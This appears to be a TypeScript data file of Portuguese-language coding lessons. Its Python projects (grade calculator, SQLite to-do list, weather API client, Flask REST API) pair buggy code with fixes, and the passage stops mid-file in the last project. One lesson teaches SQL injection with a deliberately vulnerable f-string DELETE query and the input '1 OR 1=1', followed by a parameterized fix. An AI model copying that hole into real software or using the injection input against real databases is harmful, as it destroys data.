export type ProjectDifficulty = 'iniciante' | 'basico' | 'intermediario' | 'avancado';
export type StepType = 'code' | 'bug' | 'refactor' | 'architecture' | 'integration';

export interface CodeBlock {
  filename: string;
  language: 'python' | 'javascript' | 'bash' | 'sql' | 'html' | 'css';
  code: string;
  highlight?: number[];
}

export interface ProjectStep {
  id: string;
  order: number;
  type: StepType;
  title: string;
  context: string;
  objective: string;
  concepts: string[];
  code?: CodeBlock;
  bugCode?: CodeBlock;
  fixedCode?: CodeBlock;
  bugDescription?: string;
  bugLesson?: string;
  checkpoint: string;
}

export interface BuildingProject {
  id: string;
  title: string;
  subtitle: string;
  description: string;
  difficulty: ProjectDifficulty;
  totalTime: string;
  techStack: string[];
  whatYoullLearn: string[];
  steps: ProjectStep[];
  finalCode?: CodeBlock;
}

const buildingProjects: BuildingProject[] = [
  // ─────────────────────────────────────────────────────────────────────────────
  // Project 1: Calculadora de Media Escolar
  // ─────────────────────────────────────────────────────────────────────────────
  {
    id: 'calc-media',
    title: 'Calculadora de Media Escolar',
    subtitle: 'De um script simples a um programa robusto',
    description:
      'Construa uma calculadora de medias escolares partindo de um script minimo e evoluindo passo a passo ate um programa com validacao de entrada, tratamento de erros e funcoes bem organizadas.',
    difficulty: 'iniciante',
    totalTime: '~1h',
    techStack: ['Python'],
    whatYoullLearn: ['funcoes', 'validacao de entrada', 'tratamento de erros', 'organizacao de codigo'],
    steps: [
      {
        id: 'calc-media-1',
        order: 1,
        type: 'code',
        title: 'O Script Inicial',
        context:
          'Todo projeto comeca pequeno. Esse script funciona, mas so enquanto o mundo e perfeito.',
        objective: 'Escrever o menor codigo possivel que resolve o problema.',
        concepts: ['listas', 'funcoes built-in', 'print'],
        code: {
          filename: 'media.py',
          language: 'python',
          code: `notas = [7.5, 8.0, 6.5, 9.0]
media = sum(notas) / len(notas)
print("Media:", media)`,
        },
        checkpoint: 'O script calcula e imprime a media corretamente.',
      },
      {
        id: 'calc-media-2',
        order: 2,
        type: 'bug',
        title: 'O Primeiro Bug Real',
        context:
          'O que acontece se nenhuma nota for fornecida? Um bug silencioso pode derrubar um programa em producao sem aviso.',
        objective: 'Descobrir e corrigir o crash causado por lista vazia.',
        concepts: ['ZeroDivisionError', 'condicional', 'validacao'],
        bugCode: {
          filename: 'media_bug.py',
          language: 'python',
          code: `notas = []
media = sum(notas) / len(notas)
print("Media:", media)`,
          highlight: [2],
        },
        bugDescription:
          'ZeroDivisionError: division by zero — linha `media = sum(notas) / len(notas)`. Quando a lista esta vazia, `len(notas)` retorna 0 e a divisao falha.',
        bugLesson:
          'Nunca assuma que a entrada e valida. Um bug real em producao nao avisa antes de acontecer.',
        fixedCode: {
          filename: 'media_fix.py',
          language: 'python',
          code: `notas = []

if not notas:
    print("Nenhuma nota informada.")
    exit()

media = sum(notas) / len(notas)
print("Media:", media)`,
          highlight: [3, 4, 5],
        },
        checkpoint: 'O programa nao crasha com lista vazia.',
      },
      {
        id: 'calc-media-3',
        order: 3,
        type: 'refactor',
        title: 'Transformando em Funcao',
        context:
          'Codigo solto no topo do arquivo e dificil de reutilizar e testar. Funcoes dao nome e fronteira para a logica.',
        objective: 'Mover o calculo para uma funcao com docstring.',
        concepts: ['def', 'docstring', 'retorno de valor'],
        code: {
          filename: 'media.py',
          language: 'python',
          code: `def calcular_media(notas: list[float]) -> float | None:
    """Retorna a media das notas ou None se a lista estiver vazia."""
    if not notas:
        return None
    return sum(notas) / len(notas)


notas = [7.5, 8.0, 6.5, 9.0]
resultado = calcular_media(notas)

if resultado is None:
    print("Nenhuma nota informada.")
else:
    print(f"Media: {resultado:.2f}")`,
        },
        checkpoint: 'A logica esta em uma funcao reutilizavel.',
      },
      {
        id: 'calc-media-4',
        order: 4,
        type: 'bug',
        title: 'Entrada Invalida do Usuario',
        context:
          'Usuarios digitam o que quiserem. Um simples `input()` sem protecao e uma porta aberta para erros.',
        objective: 'Proteger a leitura de notas contra entradas nao numericas.',
        concepts: ['try/except', 'ValueError', 'input', 'loop while'],
        bugCode: {
          filename: 'media_input_bug.py',
          language: 'python',
          code: `notas = []
qtd = int(input("Quantas notas? "))

for i in range(qtd):
    nota = float(input(f"Nota {i + 1}: "))
    notas.append(nota)

print("Media:", sum(notas) / len(notas))`,
          highlight: [5],
        },
        bugDescription:
          'Se o usuario digitar "oito" no lugar de 8, ocorre: ValueError: could not convert string to float: \'oito\'. O programa crasha sem mensagem util.',
        bugLesson: 'Nunca confie no que o usuario digita. Valide sempre antes de converter.',
        fixedCode: {
          filename: 'media_input_fix.py',
          language: 'python',
          code: `def ler_nota(prompt: str) -> float:
    while True:
        try:
            return float(input(prompt))
        except ValueError:
            print("Valor invalido. Digite um numero.")


notas = []
qtd_str = input("Quantas notas? ")

try:
    qtd = int(qtd_str)
except ValueError:
    print("Quantidade invalida.")
    exit()

for i in range(qtd):
    nota = ler_nota(f"Nota {i + 1}: ")
    notas.append(nota)

if notas:
    print(f"Media: {sum(notas) / len(notas):.2f}")`,
          highlight: [3, 4, 5, 6],
        },
        checkpoint: 'O programa aceita apenas numeros validos.',
      },
      {
        id: 'calc-media-5',
        order: 5,
        type: 'architecture',
        title: 'Organizacao Final',
        context:
          'Codigo pequeno cresce. Organizar desde cedo economiza horas de refatoracao depois. Cada funcao com uma unica responsabilidade e mais facil de testar, ler e alterar.',
        objective:
          'Separar o programa em funcoes especializadas e uma funcao main() que coordena tudo.',
        concepts: ['separacao de responsabilidades', 'main()', 'coesao', 'legibilidade'],
        code: {
          filename: 'media_final.py',
          language: 'python',
          code: `def ler_nota(prompt: str) -> float:
    """Le uma nota valida do usuario."""
    while True:
        try:
            return float(input(prompt))
        except ValueError:
            print("Valor invalido. Digite um numero.")


def obter_notas() -> list[float]:
    """Solicita ao usuario a quantidade e os valores das notas."""
    while True:
        try:
            qtd = int(input("Quantas notas voce tem? "))
            if qtd <= 0:
                print("Digite um numero positivo.")
                continue
            break
        except ValueError:
            print("Quantidade invalida.")

    notas = []
    for i in range(qtd):
        notas.append(ler_nota(f"Nota {i + 1}: "))
    return notas


def calcular_media(notas: list[float]) -> float | None:
    """Retorna a media ou None se a lista estiver vazia."""
    if not notas:
        return None
    return sum(notas) / len(notas)


def exibir_resultado(media: float | None) -> None:
    """Exibe o resultado formatado."""
    if media is None:
        print("Nenhuma nota informada.")
    elif media >= 7:
        print(f"Media: {media:.2f} - Aprovado!")
    else:
        print(f"Media: {media:.2f} - Reprovado.")


def main() -> None:
    notas = obter_notas()
    media = calcular_media(notas)
    exibir_resultado(media)


if __name__ == "__main__":
    main()`,
        },
        checkpoint: 'Cada funcao tem uma responsabilidade unica.',
      },
    ],
  },

  // ─────────────────────────────────────────────────────────────────────────────
  // Project 2: Lista de Tarefas com Banco de Dados
  // ─────────────────────────────────────────────────────────────────────────────
  {
    id: 'lista-tarefas-db',
    title: 'Lista de Tarefas com Banco de Dados',
    subtitle: 'Da memoria efemera a persistencia real com SQLite',
    description:
      'Construa um gerenciador de tarefas em etapas: comece com uma lista em memoria, encontre os bugs de indices, migre para SQLite e aprenda por que parametros SQL existem.',
    difficulty: 'basico',
    totalTime: '~2h',
    techStack: ['Python', 'SQLite'],
    whatYoullLearn: [
      'persistencia de dados',
      'SQL basico',
      'CRUD',
      'tratamento de erros de banco',
      'arquitetura em camadas',
    ],
    steps: [
      {
        id: 'lista-tarefas-1',
        order: 1,
        type: 'code',
        title: 'A Lista em Memoria',
        context:
          'Primeiro faca funcionar. Dados em memoria sao simples — o problema e que somem quando o programa fecha.',
        objective: 'Implementar CRUD basico com uma lista Python.',
        concepts: ['list', 'append', 'remove', 'enumerate', 'loop'],
        code: {
          filename: 'tarefas.py',
          language: 'python',
          code: `tarefas: list[str] = []


def adicionar(descricao: str) -> None:
    tarefas.append(descricao)
    print(f"Tarefa adicionada: {descricao}")


def listar() -> None:
    if not tarefas:
        print("Nenhuma tarefa.")
        return
    for i, t in enumerate(tarefas):
        print(f"[{i}] {t}")


def remover(indice: int) -> None:
    del tarefas[indice]
    print("Tarefa removida.")


def main() -> None:
    adicionar("Estudar Python")
    adicionar("Ler documentacao do SQLite")
    listar()
    remover(0)
    listar()


if __name__ == "__main__":
    main()`,
        },
        checkpoint: 'CRUD basico funciona em memoria.',
      },
      {
        id: 'lista-tarefas-2',
        order: 2,
        type: 'bug',
        title: 'O Bug do Indice',
        context:
          'Indices numericos sao frageis — eles mudam conforme itens sao adicionados e removidos.',
        objective: 'Entender por que indices sao perigosos e como IDs fixos resolvem o problema.',
        concepts: ['IndexError', 'validacao de indice', 'IDs unicos'],
        bugCode: {
          filename: 'tarefas_bug.py',
          language: 'python',
          code: `tarefas: list[str] = []


def remover(indice: int) -> None:
    del tarefas[indice]  # crasha se lista vazia ou indice invalido
    print("Tarefa removida.")


# Testando o crash
tarefas = []
remover(0)`,
          highlight: [4],
        },
        bugDescription:
          'IndexError: list index out of range — se a lista estiver vazia ou o indice nao existir, o programa crasha sem mensagem util.',
        bugLesson:
          'Indices sao frageis. IDs unicos sao melhores — eles nao mudam quando outros itens sao removidos.',
        fixedCode: {
          filename: 'tarefas_fix.py',
          language: 'python',
          code: `tarefas: list[str] = []


def remover(indice: int) -> None:
    if not tarefas:
        print("A lista esta vazia.")
        return
    if indice < 0 or indice >= len(tarefas):
        print(f"Indice invalido. Use 0 a {len(tarefas) - 1}.")
        return
    removida = tarefas.pop(indice)
    print(f"Removida: {removida}")`,
          highlight: [5, 6, 7, 8, 9],
        },
        checkpoint: 'Remocao nunca crasha com indice invalido.',
      },
      {
        id: 'lista-tarefas-3',
        order: 3,
        type: 'integration',
        title: 'Adicionando SQLite',
        context:
          'Banco de dados resolve o problema de persistencia. Mas introduz novos tipos de erro — conexoes, schemas e queries.',
        objective: 'Substituir a lista em memoria por um banco SQLite com CRUD completo.',
        concepts: ['sqlite3', 'CREATE TABLE', 'INSERT', 'SELECT', 'DELETE', 'commit'],
        code: {
          filename: 'tarefas_db.py',
          language: 'python',
          code: `import sqlite3

DB_PATH = "tarefas.db"


def conectar() -> sqlite3.Connection:
    conn = sqlite3.connect(DB_PATH)
    conn.execute("""
        CREATE TABLE IF NOT EXISTS tarefas (
            id   INTEGER PRIMARY KEY AUTOINCREMENT,
            desc TEXT NOT NULL
        )
    """)
    conn.commit()
    return conn


def adicionar(descricao: str) -> None:
    with conectar() as conn:
        conn.execute("INSERT INTO tarefas (desc) VALUES (?)", (descricao,))
    print(f"Adicionada: {descricao}")


def listar() -> None:
    with conectar() as conn:
        rows = conn.execute("SELECT id, desc FROM tarefas").fetchall()
    if not rows:
        print("Nenhuma tarefa.")
        return
    for row in rows:
        print(f"[{row[0]}] {row[1]}")


def remover(tarefa_id: int) -> None:
    with conectar() as conn:
        conn.execute("DELETE FROM tarefas WHERE id = ?", (tarefa_id,))
    print(f"Tarefa {tarefa_id} removida.")


def main() -> None:
    adicionar("Estudar SQLite")
    adicionar("Fazer backup do banco")
    listar()
    remover(1)
    listar()


if __name__ == "__main__":
    main()`,
        },
        checkpoint: 'Tarefas persistem entre execucoes.',
      },
      {
        id: 'lista-tarefas-4',
        order: 4,
        type: 'bug',
        title: 'SQL Injection',
        context:
          'Concatenar strings em queries SQL e uma das vulnerabilidades mais antigas e mais exploradas da historia.',
        objective: 'Identificar e corrigir SQL injection usando parametros.',
        concepts: ['SQL injection', 'parametros SQL', 'seguranca', 'query parametrizada'],
        bugCode: {
          filename: 'tarefas_injection.py',
          language: 'python',
          code: `import sqlite3


def remover_inseguro(conn: sqlite3.Connection, tarefa_id: str) -> None:
    # PERIGO: concatenacao direta de string na query
    query = f"DELETE FROM tarefas WHERE id = {tarefa_id}"
    conn.execute(query)
    conn.commit()


# Se o usuario digitar: 1 OR 1=1
# A query vira: DELETE FROM tarefas WHERE id = 1 OR 1=1
# Resultado: TODAS as tarefas sao deletadas!`,
          highlight: [6],
        },
        bugDescription:
          'Se o usuario digitar `1 OR 1=1`, a query vira DELETE FROM tarefas WHERE id = 1 OR 1=1 — e deleta TUDO.',
        bugLesson:
          'NUNCA concatene strings em SQL. Use sempre parametros com `?` — o driver faz o escape automaticamente.',
        fixedCode: {
          filename: 'tarefas_seguro.py',
          language: 'python',
          code: `import sqlite3


def remover_seguro(conn: sqlite3.Connection, tarefa_id: int) -> None:
    # Correto: parametro separado, nunca concatenado
    conn.execute("DELETE FROM tarefas WHERE id = ?", (tarefa_id,))
    conn.commit()
    print(f"Tarefa {tarefa_id} removida com seguranca.")`,
          highlight: [6],
        },
        checkpoint: 'Queries usam parametros, nao concatenacao de strings.',
      },
      {
        id: 'lista-tarefas-5',
        order: 5,
        type: 'architecture',
        title: 'Separando Camadas',
        context:
          'Se o banco mudar amanha, so o database.py precisa mudar. O resto do codigo nao sabe como os dados sao guardados.',
        objective: 'Dividir o codigo em duas camadas: banco de dados e logica de aplicacao.',
        concepts: ['separacao de camadas', 'coesao', 'acoplamento', 'modularidade'],
        code: {
          filename: 'database.py',
          language: 'python',
          code: `# database.py — unica responsabilidade: falar com o banco
import sqlite3

DB_PATH = "tarefas.db"


def get_connection() -> sqlite3.Connection:
    conn = sqlite3.connect(DB_PATH)
    conn.execute("""
        CREATE TABLE IF NOT EXISTS tarefas (
            id   INTEGER PRIMARY KEY AUTOINCREMENT,
            desc TEXT NOT NULL
        )
    """)
    conn.commit()
    return conn


def db_adicionar(descricao: str) -> None:
    with get_connection() as conn:
        conn.execute("INSERT INTO tarefas (desc) VALUES (?)", (descricao,))


def db_listar() -> list[tuple[int, str]]:
    with get_connection() as conn:
        return conn.execute("SELECT id, desc FROM tarefas").fetchall()


def db_remover(tarefa_id: int) -> None:
    with get_connection() as conn:
        conn.execute("DELETE FROM tarefas WHERE id = ?", (tarefa_id,))


# ─────────────────────────────────────────────────────
# app.py — unica responsabilidade: logica e interface
# ─────────────────────────────────────────────────────
# from database import db_adicionar, db_listar, db_remover
#
# def listar_tarefas() -> None:
#     tarefas = db_listar()
#     if not tarefas:
#         print("Nenhuma tarefa.")
#     for tid, desc in tarefas:
#         print(f"[{tid}] {desc}")
#
# Nenhuma linha SQL aqui — apenas chamadas ao database.py`,
        },
        checkpoint: 'app.py nao contem nenhuma query SQL diretamente.',
      },
    ],
  },

  // ─────────────────────────────────────────────────────────────────────────────
  // Project 3: App de Clima com API Externa
  // ─────────────────────────────────────────────────────────────────────────────
  {
    id: 'api-clima',
    title: 'App de Clima com API Externa',
    subtitle: 'Aprenda a lidar com o mundo real: falhas, limites e cache',
    description:
      'Construa um app que consulta uma API de clima, trate todos os tipos de falha de rede, implemente cache local com SQLite e organize o codigo em modulos independentes.',
    difficulty: 'intermediario',
    totalTime: '~3h',
    techStack: ['Python', 'requests', 'JSON', 'SQLite'],
    whatYoullLearn: [
      'HTTP requests',
      'tratamento de erros de API',
      'cache local',
      'rate limits',
      'parsing de JSON',
    ],
    steps: [
      {
        id: 'api-clima-1',
        order: 1,
        type: 'code',
        title: 'Primeira Chamada de API',
        context:
          'APIs sao a porta de entrada para o mundo real. Com poucos comandos voce acessa dados ao vivo — mas o mundo real tem falhas.',
        objective: 'Fazer a primeira requisicao HTTP e exibir os dados JSON retornados.',
        concepts: ['requests.get', 'response.json', 'HTTP', 'JSON'],
        code: {
          filename: 'clima.py',
          language: 'python',
          code: `import requests

API_KEY = "sua_chave_aqui"
CIDADE = "Sao Paulo"
URL = f"https://api.openweathermap.org/data/2.5/weather?q={CIDADE}&appid={API_KEY}&lang=pt_br&units=metric"


def buscar_clima(cidade: str) -> dict:
    url = URL.replace(CIDADE, cidade)
    response = requests.get(url)
    return response.json()


dados = buscar_clima("Sao Paulo")
print(f"Cidade: {dados['name']}")
print(f"Temperatura: {dados['main']['temp']}C")
print(f"Descricao: {dados['weather'][0]['description']}")`,
        },
        checkpoint: 'A chamada retorna dados em JSON e sao impressos no terminal.',
      },
      {
        id: 'api-clima-2',
        order: 2,
        type: 'bug',
        title: 'E Quando a API Cai?',
        context:
          'Toda requisicao de rede pode falhar — internet cai, servidor sobrecarrega, DNS nao resolve. Codigo sem protecao crasha na primeira falha.',
        objective: 'Adicionar tratamento de erros de conexao e timeout.',
        concepts: ['ConnectionError', 'Timeout', 'try/except', 'requests.exceptions'],
        bugCode: {
          filename: 'clima_sem_try.py',
          language: 'python',
          code: `import requests


def buscar_clima(cidade: str) -> dict:
    # Sem timeout, sem try/except — codigo frágil
    response = requests.get(
        f"https://api.openweathermap.org/data/2.5/weather?q={cidade}&appid=KEY"
    )
    return response.json()


print(buscar_clima("Sao Paulo"))  # crasha se sem internet`,
          highlight: [5, 6, 7, 8],
        },
        bugDescription:
          'requests.exceptions.ConnectionError — sua aplicacao crasha imediatamente se nao houver internet ou se o servidor demorar.',
        bugLesson: 'Toda chamada de rede pode falhar. Sempre. Trate o erro ou o usuario nao entende o que aconteceu.',
        fixedCode: {
          filename: 'clima_com_try.py',
          language: 'python',
          code: `import requests


def buscar_clima(cidade: str) -> dict | None:
    try:
        response = requests.get(
            f"https://api.openweathermap.org/data/2.5/weather?q={cidade}&appid=KEY",
            timeout=5,
        )
        response.raise_for_status()
        return response.json()
    except requests.exceptions.ConnectionError:
        print("Sem conexao com a internet.")
    except requests.exceptions.Timeout:
        print("A API demorou demais para responder.")
    except requests.exceptions.RequestException as e:
        print(f"Erro de rede: {e}")
    return None`,
          highlight: [5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15],
        },
        checkpoint: 'O app mostra mensagem amigavel quando offline.',
      },
      {
        id: 'api-clima-3',
        order: 3,
        type: 'bug',
        title: 'Chave Invalida e Rate Limit',
        context:
          'Mesmo com internet funcionando, a API pode rejeitar sua requisicao por varios motivos. O codigo precisa lidar com cada um.',
        objective: 'Tratar codigos HTTP 401 (nao autorizado) e 429 (muitas requisicoes).',
        concepts: ['HTTP status codes', '401', '429', 'raise_for_status', 'HTTPError'],
        bugCode: {
          filename: 'clima_sem_status.py',
          language: 'python',
          code: `import requests


def buscar_clima(cidade: str) -> dict:
    response = requests.get(
        f"https://api.openweathermap.org/data/2.5/weather?q={cidade}&appid=INVALIDA"
    )
    # Nao verifica o status — usa o JSON mesmo em caso de erro
    return response.json()


dados = buscar_clima("Sao Paulo")
print(dados["main"]["temp"])  # KeyError: 'main' — a API retornou {"cod": 401}`,
          highlight: [8, 12],
        },
        bugDescription:
          'response.status_code 401 = chave invalida. 429 = muitas requisicoes. O codigo nao verifica nada disso e tenta usar o JSON como se fosse dados validos.',
        bugLesson: 'Sempre verifique o status HTTP antes de usar o corpo da resposta.',
        fixedCode: {
          filename: 'clima_com_status.py',
          language: 'python',
          code: `import requests
from requests.exceptions import HTTPError


def buscar_clima(cidade: str) -> dict | None:
    try:
        response = requests.get(
            f"https://api.openweathermap.org/data/2.5/weather?q={cidade}&appid=KEY",
            timeout=5,
        )
        response.raise_for_status()
        return response.json()
    except HTTPError as e:
        code = e.response.status_code if e.response else 0
        if code == 401:
            print("Chave de API invalida.")
        elif code == 404:
            print(f"Cidade '{cidade}' nao encontrada.")
        elif code == 429:
            print("Limite de requisicoes atingido. Tente em alguns minutos.")
        else:
            print(f"Erro HTTP {code}.")
    return None`,
          highlight: [11, 13, 14, 15, 16, 17, 18, 19, 20],
        },
        checkpoint: 'Cada codigo HTTP tem tratamento especifico e mensagem clara.',
      },
      {
        id: 'api-clima-4',
        order: 4,
        type: 'integration',
        title: 'Cache Local com SQLite',
        context:
          'APIs gratuitas tem limite de chamadas. Cache economiza requisicoes, acelera o app e permite funcionar sem internet para consultas recentes.',
        objective: 'Salvar resultados no SQLite e usar o cache se ele tiver menos de 1 hora.',
        concepts: ['cache', 'TTL', 'sqlite3', 'datetime', 'timestamp'],
        code: {
          filename: 'cache.py',
          language: 'python',
          code: `import sqlite3
import time
import json

DB_PATH = "clima_cache.db"
TTL_SEGUNDOS = 3600  # 1 hora


def _conectar() -> sqlite3.Connection:
    conn = sqlite3.connect(DB_PATH)
    conn.execute("""
        CREATE TABLE IF NOT EXISTS cache (
            cidade    TEXT PRIMARY KEY,
            timestamp REAL NOT NULL,
            dados     TEXT NOT NULL
        )
    """)
    conn.commit()
    return conn


def salvar(cidade: str, dados: dict) -> None:
    with _conectar() as conn:
        conn.execute(
            "INSERT OR REPLACE INTO cache (cidade, timestamp, dados) VALUES (?, ?, ?)",
            (cidade.lower(), time.time(), json.dumps(dados)),
        )


def buscar_cache(cidade: str) -> dict | None:
    with _conectar() as conn:
        row = conn.execute(
            "SELECT timestamp, dados FROM cache WHERE cidade = ?",
            (cidade.lower(),),
        ).fetchone()

    if row is None:
        return None

    idade = time.time() - row[0]
    if idade > TTL_SEGUNDOS:
        return None  # cache expirado

    return json.loads(row[1])`,
        },
        checkpoint: 'Segunda consulta para a mesma cidade usa cache e nao faz requisicao nova.',
      },
      {
        id: 'api-clima-5',
        order: 5,
        type: 'architecture',
        title: 'Organizando o Codigo',
        context:
          'Cada arquivo tem uma responsabilidade: buscar, guardar, formatar, coordenar. Mudar de API exige alterar apenas um arquivo.',
        objective: 'Dividir o projeto em api_client.py, cache.py, formatter.py e main.py.',
        concepts: ['modularidade', 'separacao de responsabilidades', 'imports', 'coesao'],
        code: {
          filename: 'main.py',
          language: 'python',
          code: `# main.py — coordena os outros modulos, nao implementa nada
from api_client import buscar_clima_api   # unico lugar que faz requests
from cache import buscar_cache, salvar    # unico lugar que fala com SQLite
from formatter import formatar_clima      # unico lugar que formata saida


def obter_clima(cidade: str) -> str:
    """Retorna clima formatado, usando cache quando possivel."""
    dados = buscar_cache(cidade)

    if dados is None:
        print(f"Consultando API para '{cidade}'...")
        dados = buscar_clima_api(cidade)
        if dados is None:
            return "Nao foi possivel obter o clima."
        salvar(cidade, dados)
    else:
        print(f"Usando cache para '{cidade}'.")

    return formatar_clima(dados)


if __name__ == "__main__":
    cidade = input("Digite a cidade: ")
    print(obter_clima(cidade))

# Para mudar de API (ex: OpenWeather -> WeatherAPI):
# Altere apenas api_client.py — main.py, cache.py e formatter.py nao mudam.`,
        },
        checkpoint: 'Mudar de API exige mudar apenas api_client.py.',
      },
    ],
  },

  // ─────────────────────────────────────────────────────────────────────────────
  // Project 4: API REST com Banco de Dados
  // ─────────────────────────────────────────────────────────────────────────────
  {
    id: 'crud-api-rest',
    title: 'API REST com Banco de Dados',
    subtitle: 'Construa uma API real com Flask, SQLite e tratamento de erros HTTP',
    description:
      'Desenvolva uma API REST completa com Flask: comece com um endpoint simples, implemente CRUD, corrija erros de validacao e aprenda a arquitetura em camadas que torna sistemas reais manuteníveis.',
    difficulty: 'avancado',
    totalTime: '~5h',
    techStack: ['Python', 'Flask', 'SQLite', 'JSON', 'HTTP'],
    whatYoullLearn: [
      'REST API design',
      'Flask routes',
      'HTTP methods',
      'validacao de dados',
      'arquitetura em camadas',
      'erros HTTP corretos',
    ],
    steps: [
      {
        id: 'crud-api-1',
        order: 1,
        type: 'code',
        title: 'Primeiro Endpoint Flask',
        context:
          'Uma API comeca com um unico endpoint. O importante e entender o ciclo: requisicao HTTP chega, Flask roteia, funcao responde com JSON.',
        objective: 'Criar um endpoint GET /produtos que retorna uma lista JSON.',
        concepts: ['Flask', 'route', 'jsonify', 'GET', 'HTTP 200'],
        code: {
          filename: 'app.py',
          language: 'python',
          code: `from flask import Flask, jsonify
from typing import Any

app = Flask(__name__)

# Dados em memoria por enquanto
produtos: list[dict[str, Any]] = [
    {"id": 1, "nome": "Teclado", "preco": 150.0},
    {"id": 2, "nome": "Mouse", "preco": 80.0},
]


@app.route("/produtos", methods=["GET"])
def listar_produtos():
    return jsonify(produtos), 200


if __name__ == "__main__":
    app.run(debug=True)

# Teste: curl http://localhost:5000/produtos`,
        },
        checkpoint: 'GET /produtos retorna JSON com status 200.',
      },
      {
        id: 'crud-api-2',
        order: 2,
        type: 'refactor',
        title: 'CRUD Completo',
        context:
          'Uma API util precisa de todos os verbos: GET para ler, POST para criar, PUT para atualizar, DELETE para remover.',
        objective: 'Implementar os 4 endpoints do CRUD com os verbos HTTP corretos.',
        concepts: ['POST', 'PUT', 'DELETE', 'request.json', 'path params', 'status codes'],
        code: {
          filename: 'app.py',
          language: 'python',
          code: `from flask import Flask, jsonify, request
from typing import Any

app = Flask(__name__)

produtos: list[dict[str, Any]] = [
    {"id": 1, "nome": "Teclado", "preco": 150.0},
]
proximo_id = 2


@app.route("/produtos", methods=["GET"])
def listar():
    return jsonify(produtos), 200


@app.route("/produtos/<int:produto_id>", methods=["GET"])
def obter(produto_id: int):
    produto = next((p for p in produtos if p["id"] == produto_id), None)
    return jsonify(produto), 200


@app.route("/produtos", methods=["POST"])
def criar():
    global proximo_id
    data = request.json
    novo = {"id": proximo_id, "nome": data["nome"], "preco": data["preco"]}
    proximo_id += 1
    produtos.append(novo)
    return jsonify(novo), 201


@app.route("/produtos/<int:produto_id>", methods=["PUT"])
def atualizar(produto_id: int):
    data = request.json
    produto = next((p for p in produtos if p["id"] == produto_id), None)
    produto.update({"nome": data["nome"], "preco": data["preco"]})
    return jsonify(produto), 200


@app.route("/produtos/<int:produto_id>", methods=["DELETE"])
def deletar(produto_id: int):
    produto = next((p for p in produtos if p["id"] == produto_id), None)
    produtos.remove(produto)
    return jsonify({"mensagem": "deletado"}), 200`,
        },
        checkpoint: 'Todos os endpoints funcionam com curl ou Postman.',
      },
      {
        id: 'crud-api-3',
        order: 3,
        type: 'bug',
        title: 'Validacao Inexistente',
        context:
          'Um servidor nunca deve retornar 500 por culpa do cliente. Se o cliente enviar dados invalidos, a resposta correta e 400 Bad Request.',
        objective: 'Validar os campos obrigatorios no POST e retornar 400 em vez de 500.',
        concepts: ['validacao', 'HTTP 400', 'HTTP 500', 'Bad Request', 'KeyError'],
        bugCode: {
          filename: 'criar_sem_validacao.py',
          language: 'python',
          code: `@app.route("/produtos", methods=["POST"])
def criar():
    global proximo_id
    data = request.json
    # Se o cliente nao enviar "nome", a linha abaixo crasha com KeyError
    novo = {"id": proximo_id, "nome": data["nome"], "preco": data["preco"]}
    proximo_id += 1
    produtos.append(novo)
    return jsonify(novo), 201

# curl -X POST http://localhost:5000/produtos -H "Content-Type: application/json" -d "{}"
# Resposta: 500 Internal Server Error — KeyError: 'nome'`,
          highlight: [6],
        },
        bugDescription:
          "KeyError: 'nome' — se o cliente nao enviar o campo, o servidor crasha com 500 Internal Server Error. O problema e do cliente, nao do servidor.",
        bugLesson:
          'O servidor nunca deve enviar 500 por culpa do cliente. Valide a entrada e retorne 400 Bad Request com uma mensagem clara.',
        fixedCode: {
          filename: 'criar_com_validacao.py',
          language: 'python',
          code: `@app.route("/produtos", methods=["POST"])
def criar():
    global proximo_id
    data = request.json or {}

    if "nome" not in data:
        return jsonify({"erro": "campo 'nome' obrigatorio"}), 400
    if "preco" not in data:
        return jsonify({"erro": "campo 'preco' obrigatorio"}), 400
    if not isinstance(data["preco"], (int, float)):
        return jsonify({"erro": "'preco' deve ser um numero"}), 400

    novo = {"id": proximo_id, "nome": data["nome"], "preco": float(data["preco"])}
    proximo_id += 1
    produtos.append(novo)
    return jsonify(novo), 201`,
          highlight: [5, 6, 7, 8, 9, 10],
        },
        checkpoint: 'Entrada invalida retorna 400, nao 500.',
      },
      {
        id: 'crud-api-4',
        order: 4,
        type: 'bug',
        title: 'ID Inexistente',
        context:
          'Quando um recurso nao existe, a resposta correta e 404 Not Found — nao um crash com erro 500.',
        objective: 'Tratar o caso de produto nao encontrado e retornar 404.',
        concepts: ['HTTP 404', 'Not Found', 'NoneType', 'tratamento de recurso ausente'],
        bugCode: {
          filename: 'obter_sem_404.py',
          language: 'python',
          code: `@app.route("/produtos/<int:produto_id>", methods=["GET"])
def obter(produto_id: int):
    produto = next((p for p in produtos if p["id"] == produto_id), None)
    # Se produto e None, jsonify(None) retorna 200 com body "null"
    # Mas em outros endpoints, acessar produto["nome"] crasha com TypeError
    return jsonify(produto), 200

# GET /produtos/9999 -> 200 com body "null" (confuso para o cliente)`,
          highlight: [4, 5],
        },
        bugDescription:
          'GET /produtos/9999 retorna 200 com body null ou crasha com TypeError: NoneType ao tentar acessar campos. O correto e 404 Not Found.',
        bugLesson: 'Recursos inexistentes devem retornar 404. O cliente precisa saber que o recurso nao existe, nao que o servidor falhou.',
        fixedCode: {
          filename: 'obter_com_404.py',
          language: 'python',
          code: `@app.route("/produtos/<int:produto_id>", methods=["GET"])
def obter(produto_id: int):
    produto = next((p for p in produtos if p["id"] == produto_id), None)

    if produto is None:
        return jsonify({"erro": "produto nao encontrado"}), 404

    return jsonify(produto), 200`,
          highlight: [5, 6],
        },
        checkpoint: 'Recursos inexistentes retornam 404 com mensagem clara.',
      },
      {
        id: 'crud-api-5',
        order: 5,
        type: 'architecture',
        title: 'Arquitetura em Camadas',
        context:
          'Essa separacao e o que torna sistemas reais manuteníveis. Cada camada so conhece a proxima — routes nao sabe SQL, service nao sabe HTTP.',
        objective:
          'Dividir o projeto em routes.py (HTTP), service.py (logica) e repository.py (banco).',
        concepts: ['camadas', 'routes', 'service', 'repository', 'acoplamento baixo'],
        code: {
          filename: 'routes.py',
          language: 'python',
          code: `# routes.py — unica responsabilidade: HTTP (request/response)
# Nao tem SQL aqui. Nao tem logica de negocio aqui.
from flask import Blueprint, jsonify, request
from service import ProdutoService

bp = Blueprint("produtos", __name__)
service = ProdutoService()


@bp.route("/produtos", methods=["GET"])
def listar():
    return jsonify(service.listar_todos()), 200


@bp.route("/produtos/<int:produto_id>", methods=["GET"])
def obter(produto_id: int):
    produto = service.buscar_por_id(produto_id)
    if produto is None:
        return jsonify({"erro": "nao encontrado"}), 404
    return jsonify(produto), 200


@bp.route("/produtos", methods=["POST"])
def criar():
    data = request.json or {}
    resultado = service.criar(data)
    if "erro" in resultado:
        return jsonify(resultado), 400
    return jsonify(resultado), 201


